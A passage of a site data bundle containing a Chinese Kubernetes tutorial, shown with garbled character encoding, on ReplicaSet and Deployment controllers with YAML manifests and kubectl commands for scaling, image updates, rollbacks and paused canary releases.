autoscaler(hpa)",charIndex:19499},{level:2,title:"DaemonSet(DS)",slug:"daemonset-ds",normalizedTitle:"daemonset(ds)",charIndex:27271},{level:2,title:"Job",slug:"job",normalizedTitle:"job",charIndex:675},{level:2,title:"CronJob(CJ)",slug:"cronjob-cj",normalizedTitle:"cronjob(cj)",charIndex:33743}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Podæ§å¶å¨ä»ç» ReplicaSet(RS) Deployment(Deploy) Horizontal Pod Autoscaler(HPA) DaemonSet(DS) Job CronJob(CJ)",content:'# Pod æ§å¶å¨ä»ç»\n\nPod æ¯ kubernetes çæå°ç®¡çååï¼å¨ kubernetes ä¸­ï¼æç§ pod çåå»ºæ¹å¼å¯ä»¥å°å¶åä¸ºä¸¤ç±»ï¼\n\n * èªä¸»å¼ podï¼kubernetes ç´æ¥åå»ºåºæ¥ç Podï¼è¿ç§ pod å é¤åå°±æ²¡æäºï¼ä¹ä¸ä¼éå»º\n * æ§å¶å¨åå»ºç podï¼kubernetes éè¿æ§å¶å¨åå»ºç podï¼è¿ç§ pod å é¤äºä¹åè¿ä¼èªå¨éå»º\n\n> ä»ä¹æ¯Podæ§å¶å¨\n> Pod æ§å¶å¨æ¯ç®¡ç pod çä¸­é´å±ï¼ä½¿ç¨ Pod æ§å¶å¨ä¹åï¼åªéè¦åè¯ Pod æ§å¶å¨ï¼æ³è¦å¤å°ä¸ªä»ä¹æ ·ç Pod å°±å¯ä»¥äºï¼å®ä¼åå»ºåºæ»¡è¶³æ¡ä»¶ç Pod å¹¶ç¡®ä¿æ¯ä¸ä¸ª Pod èµæºå¤äºç¨æ·ææçç®æ ç¶æãå¦æ Pod èµæºå¨è¿è¡ä¸­åºç°æéï¼å®ä¼åºäºæå®ç­ç¥éæ°ç¼æ Podã\n\nå¨ kubernetes ä¸­ï¼æå¾å¤ç±»åç pod æ§å¶å¨ï¼æ¯ç§é½æèªå·±çéåçåºæ¯ï¼å¸¸è§çæä¸é¢è¿äºï¼\n\n * ReplicationControllerï¼æ¯è¾åå§ç pod æ§å¶å¨ï¼å·²ç»è¢«åºå¼ï¼ç± ReplicaSet æ¿ä»£\n * ReplicaSetï¼ä¿è¯å¯æ¬æ°éä¸ç´ç»´æå¨ææå¼ï¼å¹¶æ¯æ pod æ°éæ©ç¼©å®¹ï¼éåçæ¬åçº§\n * Deploymentï¼éè¿æ§å¶ ReplicaSet æ¥æ§å¶ Podï¼å¹¶æ¯ææ»å¨åçº§ãåéçæ¬\n * Horizontal Pod Autoscalerï¼å¯ä»¥æ ¹æ®éç¾¤è´è½½èªå¨æ°´å¹³è°æ´ Pod çæ°éï¼å®ç°åå³°å¡«è°·\n * DaemonSetï¼å¨éç¾¤ä¸­çæå® Node ä¸è¿è¡ä¸ä»è¿è¡ä¸ä¸ªå¯æ¬ï¼ä¸è¬ç¨äºå®æ¤è¿ç¨ç±»çä»»å¡\n * Jobï¼å®åå»ºåºæ¥ç pod åªè¦å®æä»»å¡å°±ç«å³éåºï¼ä¸éè¦éå¯æéå»ºï¼ç¨äºæ§è¡ä¸æ¬¡æ§ä»»å¡\n * Cronjobï¼å®åå»ºç Pod è´è´£å¨ææ§ä»»å¡æ§å¶ï¼ä¸éè¦æç»­åå°è¿è¡\n * StatefulSetï¼ç®¡çæç¶æåºç¨\n\n\n# ReplicaSet(RS)\n\nReplicaSet çä¸»è¦ä½ç¨æ¯ä¿è¯ä¸å®æ°éç pod æ­£å¸¸è¿è¡ï¼å®ä¼æç»­çå¬è¿äº Pod çè¿è¡ç¶æï¼ä¸æ¦ Pod åçæéï¼å°±ä¼éå¯æéå»ºãåæ¶å®è¿æ¯æå¯¹ pod æ°éçæ©ç¼©å®¹åéåçæ¬çåéçº§ã\n\n\n\nReplicaSet çèµæºæ¸åæä»¶ï¼\n\napiVersion: apps/v1 # çæ¬å·\nkind: ReplicaSet # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: rs\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: nginx-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¨è¿éé¢ï¼éè¦æ°äºè§£çéç½®é¡¹å°±æ¯ spec ä¸é¢å ä¸ªéé¡¹ï¼\n\n * replicasï¼æå®å¯æ¬æ°éï¼å¶å®å°±æ¯å½å rs åå»ºåºæ¥ç pod çæ°éï¼é»è®¤ä¸º 1\n * selectorï¼éæ©å¨ï¼å®çä½ç¨æ¯å»ºç« pod æ§å¶å¨å pod ä¹é´çå³èå³ç³»ï¼éç¨ç Label Selector æºå¶\n   å¨ pod æ¨¡æ¿ä¸å®ä¹ labelï¼å¨æ§å¶å¨ä¸å®ä¹éæ©å¨ï¼å°±å¯ä»¥è¡¨æå½åæ§å¶å¨è½ç®¡çåªäº pod äº\n * templateï¼æ¨¡æ¿ï¼å°±æ¯å½åæ§å¶å¨åå»º pod æä½¿ç¨çæ¨¡æ¿æ¿ï¼éé¢å¶å®å°±æ¯åä¸ç« å­¦è¿ç pod çå®ä¹\n\nåå»º ReplicaSet\nåå»º pc-replicaset.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: ReplicaSet   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºrs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# æ¥çrs\n# DESIRED:ææå¯æ¬æ°é  \n# CURRENT:å½åå¯æ¬æ°é  \n# READY:å·²ç»åå¤å¥½æä¾æå¡çå¯æ¬æ°é\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nNAME          DESIRED   CURRENT READY AGE   CONTAINERS   IMAGES             SELECTOR\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# æ¥çå½åæ§å¶å¨åå»ºåºæ¥çpod\n# è¿éåç°æ§å¶å¨åå»ºåºæ¥çpodçåç§°æ¯å¨æ§å¶å¨åç§°åé¢æ¼æ¥äº-xxxxxéæºç \n[root@k8s-master01 ~]# kubectl get pod -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          54s\npc-replicaset-fmb8f   1/1     Running   0          54s\npc-replicaset-snrk2   1/1     Running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ©ç¼©å®¹\n\n# ç¼è¾rsçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 6å³å¯\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          114m\npc-replicaset-cftnp   1/1     Running   0          10s\npc-replicaset-fjlm6   1/1     Running   0          10s\npc-replicaset-fmb8f   1/1     Running   0          114m\npc-replicaset-s2whj   1/1     Running   0          10s\npc-replicaset-snrk2   1/1     Running   0          114m\n\n# å½ç¶ä¹å¯ä»¥ç´æ¥ä½¿ç¨å½ä»¤å®ç°\n# ä½¿ç¨scaleå½ä»¤å®ç°æ©ç¼©å®¹ï¼ åé¢--replicas=nç´æ¥æå®ç®æ æ°éå³å¯\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# å½ä»¤è¿è¡å®æ¯ï¼ç«å³æ¥çï¼åç°å·²ç»æ4ä¸ªå¼å§åå¤éåºäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS        RESTARTS   AGE\npc-replicaset-6vmvt   0/1     Terminating   0          118m\npc-replicaset-cftnp   0/1     Terminating   0          4m17s\npc-replicaset-fjlm6   0/1     Terminating   0          4m17s\npc-replicaset-fmb8f   1/1     Running       0          118m\npc-replicaset-s2whj   0/1     Terminating   0          4m17s\npc-replicaset-snrk2   1/1     Running       0          118m\n\n#ç¨ç­çå»ï¼å°±åªå©ä¸2ä¸ªäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npc-replicaset-fmb8f   1/1     Running   0          119m\npc-replicaset-snrk2   1/1     Running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\néååçº§\n\n# ç¼è¾rsçå®¹å¨éå - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# åæ ·çéçï¼ä¹å¯ä»¥ä½¿ç¨å½ä»¤å®æè¿ä¸ªå·¥ä½\n# kubectl set image rs rsåç§° å®¹å¨=éåçæ¬ -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                 DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nå é¤ ReplicaSet\n\n# ä½¿ç¨kubectl deleteå½ä»¤ä¼å é¤æ­¤RSä»¥åå®ç®¡ççPod\n# å¨kuberneteså é¤RSåï¼ä¼å°RSçreplicasclearè°æ´ä¸º0ï¼ç­å¾ææçPodè¢«å é¤åï¼å¨æ§è¡RSå¯¹è±¡çå é¤\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nNo resources found in dev namespace.\n\n# å¦æå¸æä»ä»å é¤RSå¯¹è±¡ï¼ä¿çPodï¼ï¼å¯ä»¥ä½¿ç¨kubectl deleteå½ä»¤æ¶æ·»å --cascade=falseéé¡¹ï¼ä¸æ¨èï¼ã\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\npc-replicaset-cl82j   1/1     Running   0          75s\npc-replicaset-dslhb   1/1     Running   0          75s\n\n# ä¹å¯ä»¥ä½¿ç¨yamlç´æ¥å é¤(æ¨è)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Deployment(Deploy)\n\nä¸ºäºæ´å¥½çè§£å³æå¡ç¼æçé®é¢ï¼kubernetes å¨ V1.2 çæ¬å¼å§ï¼å¼å¥äº Deployment æ§å¶å¨ãå¼å¾ä¸æçæ¯ï¼è¿ç§æ§å¶å¨å¹¶ä¸ç´æ¥ç®¡ç podï¼èæ¯éè¿ç®¡ç ReplicaSet æ¥ç®ä»ç®¡ç Podï¼å³ï¼Deployment ç®¡ç ReplicaSetï¼ReplicaSet ç®¡ç Podãæä»¥ Deployment æ¯ ReplicaSet åè½æ´å å¼ºå¤§ã\n\n\n\nDeployment ä¸»è¦åè½æä¸é¢å ä¸ªï¼\n\n * æ¯æ ReplicaSet çææåè½\n * æ¯æåå¸çåæ­¢ãç»§ç»­\n * æ¯ææ»å¨æ´æ°ååæ»çæ¬\n\nDeployment çèµæºæ¸åæä»¶ï¼\n\napiVersion: apps/v1 # çæ¬å·\nkind: Deployment # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: deploy\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  revisionHistoryLimit: 3 # ä¿çåå²çæ¬\n  paused: false # æåé¨ç½²ï¼é»è®¤æ¯false\n  progressDeadlineSeconds: 600 # é¨ç½²è¶æ¶æ¶é´ï¼sï¼ï¼é»è®¤æ¯600\n  strategy: # ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n    rollingUpdate: # æ»å¨æ´æ°\n      maxSurge: 30% # æå¤§é¢å¤å¯ä»¥å­å¨çå¯æ¬æ°ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n      maxUnavailable: 30% # æå¤§ä¸å¯ç¨ç¶æç Pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: nginx-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nåå»º deployment\nåå»º pc-deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºdeployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# æ¥çdeployment\n# UP-TO-DATE ææ°çæ¬çpodçæ°é\n# AVAILABLE  å½åå¯ç¨çpodçæ°é\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   3/3     3            3           15s\n\n# æ¥çrs\n# åç°rsçåç§°æ¯å¨åæ¥deploymentçåå­åé¢æ·»å äºä¸ä¸ª10ä½æ°çéæºä¸²\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   3         3         3       23s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          107s\npc-deployment-6696798b78-smpvp   1/1     Running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ©ç¼©å®¹\n\n# åæ´å¯æ¬æ°éä¸º5ä¸ª\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# æ¥çdeployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   5/5     5            5           2m\n\n# æ¥çpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          94s\npc-deployment-6696798b78-mktqv   1/1     Running   0          93s\npc-deployment-6696798b78-smpvp   1/1     Running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          4m19s\n\n# ç¼è¾deploymentçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 4å³å¯\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     Running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\néåæ´æ°\ndeployment æ¯æä¸¤ç§æ´æ°ç­ç¥: éå»ºæ´æ°ï¼å æææèçæ¬å¾podï¼ç¶åéå»ºæ°çæ¬çpodï¼ å æ»å¨æ´æ°ï¼é»è®¤ï¼ï¼ä¸ä¼ä¸æ¬¡æ§å é¤ï¼åå ä¸é¨åä½çæ¬ï¼å»ºç«ä¸é¨åæ°çæ¬ï¼ä»¥æ­¤ç±»æ¨ï¼ç´å°æ»¡è¶³æ°éï¼ , å¯ä»¥éè¿ strategy æå®ç­ç¥ç±»åï¼æ¯æä¸¤ä¸ªå±æ§:\n\nstrategyï¼æå®æ°çPodæ¿æ¢æ§çPodçç­ç¥ï¼ æ¯æä¸¤ä¸ªå±æ§ï¼\n  typeï¼æå®ç­ç¥ç±»åï¼æ¯æä¸¤ç§ç­ç¥\n    Recreateï¼å¨åå»ºåºæ°çPodä¹åä¼åææææå·²å­å¨çPod\n    RollingUpdateï¼æ»å¨æ´æ°ï¼å°±æ¯ææ­»ä¸é¨åï¼å°±å¯å¨ä¸é¨åï¼å¨æ´æ°è¿ç¨ä¸­ï¼å­å¨ä¸¤ä¸ªçæ¬Pod\n  rollingUpdateï¼å½typeä¸ºRollingUpdateæ¶çæï¼ç¨äºä¸ºRollingUpdateè®¾ç½®åæ°ï¼æ¯æä¸¤ä¸ªå±æ§ï¼\n    maxUnavailableï¼ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­ä¸å¯ç¨Podçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n    maxSurgeï¼ ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­å¯ä»¥è¶è¿ææçPodçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néå»ºæ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: Recreate # éå»ºæ´æ°\n\n\n1\n2\n3\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-65qcw   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     Running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     Pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     Pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     Pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     ContainerCreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     Running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     Running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     Running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\næ»å¨æ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n    rollingUpdate:\n      maxSurge: 25% \n      maxUnavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                           READY   STATUS    RESTARTS   AGE\npc-deployment-c848d767-8rbzt   1/1     Running   0          31m\npc-deployment-c848d767-h4p68   1/1     Running   0          31m\npc-deployment-c848d767-hlmz4   1/1     Running   0          31m\npc-deployment-c848d767-rrqcn   1/1     Running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     Pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     Running             0          1s\npc-deployment-c848d767-h4p68    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     Pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     Running             0          2s\npc-deployment-c848d767-hlmz4    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     Pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     Running             0          0s\npc-deployment-c848d767-8rbzt    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     Pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     Running             0          2s\npc-deployment-c848d767-rrqcn    0/1     Terminating         0          34m\n\n# è³æ­¤ï¼æ°çæ¬çpodåå»ºå®æ¯ï¼å°±çæ¬çpodéæ¯å®æ¯\n# ä¸­é´è¿ç¨æ¯æ»å¨è¿è¡çï¼ä¹å°±æ¯è¾¹éæ¯è¾¹åå»º\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\næ»å¨æ´æ°çè¿ç¨ï¼\n\n\n\néåæ´æ°ä¸­ rs çååï¼å¯ä»¥å¨åå»ºéåå¾æ¶åå  --recode åæ°ï¼æå©äºè®°å½åå»ºè¿ç¨ç­ã\n\n# æ¥çrs,åç°åæ¥çrsçä¾æ§å­å¨ï¼åªæ¯podæ°éåä¸ºäº0ï¼èååæ°äº§çäºä¸ä¸ªrsï¼podæ°éä¸º4\n# å¶å®è¿å°±æ¯deploymentè½å¤è¿è¡çæ¬åéçå¥¥å¦æå¨ï¼åé¢ä¼è¯¦ç»è§£é\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nçæ¬åé\ndeployment æ¯æçæ¬åçº§è¿ç¨ä¸­çæåãç»§ç»­åè½ä»¥åçæ¬åéç­è¯¸å¤åè½ï¼ä¸é¢å·ä½æ¥ç.\n\nkubectl rolloutï¼ çæ¬åçº§ç¸å³åè½ï¼æ¯æä¸é¢çéé¡¹ï¼\n\n * status æ¾ç¤ºå½ååçº§ç¶æ\n * history æ¾ç¤º åçº§åå²è®°å½\n * pause æåçæ¬åçº§è¿ç¨\n * resume ç»§ç»­å·²ç»æåççæ¬åçº§è¿ç¨\n * restart éå¯çæ¬åçº§è¿ç¨\n * undo åæ»å°ä¸ä¸çº§çæ¬ï¼å¯ä»¥ä½¿ç¨ --to-revision åæ»å°æå®çæ¬ï¼\n\n# æ¥çå½ååçº§çæ¬çç¶æ\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# æ¥çåçº§åå²è®°å½\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nREVISION  CHANGE-CAUSE\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# å¯ä»¥åç°æä¸æ¬¡çæ¬è®°å½ï¼è¯´æå®æè¿ä¸¤æ¬¡åçº§\n\n# çæ¬åæ»\n# è¿éç´æ¥ä½¿ç¨--to-revision=1åæ»å°äº1çæ¬ï¼ å¦æçç¥è¿ä¸ªéé¡¹ï¼å°±æ¯åéå°ä¸ä¸ªçæ¬ï¼å°±æ¯2çæ¬\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# æ¥çåç°ï¼éè¿nginxéåçæ¬å¯ä»¥åç°å°äºç¬¬ä¸ç\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# æ¥çrsï¼åç°ç¬¬ä¸ä¸ªrsä¸­æ4ä¸ªpodè¿è¡ï¼åé¢ä¸¤ä¸ªçæ¬çrsä¸­podä¸ºè¿è¡\n# å¶å®deploymentä¹æä»¥å¯æ¯å®ç°çæ¬çåæ»ï¼å°±æ¯éè¿è®°å½ä¸åå²rsæ¥å®ç°çï¼\n# ä¸æ¦æ³åæ»å°åªä¸ªçæ¬ï¼åªéè¦å°å½åçæ¬podæ°ééä¸º0ï¼ç¶åå°åæ»çæ¬çpodæåä¸ºç®æ æ°éå°±å¯ä»¥äº\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\néä¸éåå¸\nDeployment æ§å¶å¨æ¯ææ§å¶æ´æ°è¿ç¨ä¸­çæ§å¶ï¼å¦ âæå (pause)â æ âç»§ç»­ (resume)â æ´æ°æä½ã\n\næ¯å¦æä¸æ¹æ°ç Pod èµæºåå»ºå®æåç«å³æåæ´æ°è¿ç¨ï¼æ­¤æ¶ï¼ä»å­å¨ä¸é¨åæ°çæ¬çåºç¨ï¼ä¸»ä½é¨åè¿æ¯æ§ççæ¬ãç¶åï¼åç­éä¸å°é¨åçç¨æ·è¯·æ±è·¯ç±å°æ°çæ¬ç Pod åºç¨ï¼ç»§ç»­è§å¯è½å¦ç¨³å®å°æææçæ¹å¼è¿è¡ãç¡®å®æ²¡é®é¢ä¹ååç»§ç»­å®æä½ä¸ç Pod èµæºæ»å¨æ´æ°ï¼å¦åç«å³åæ»æ´æ°æä½ãè¿å°±æ¯æè°çéä¸éåå¸ã\n\n# æ´æ°deploymentççæ¬ï¼å¹¶éç½®æådeployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n 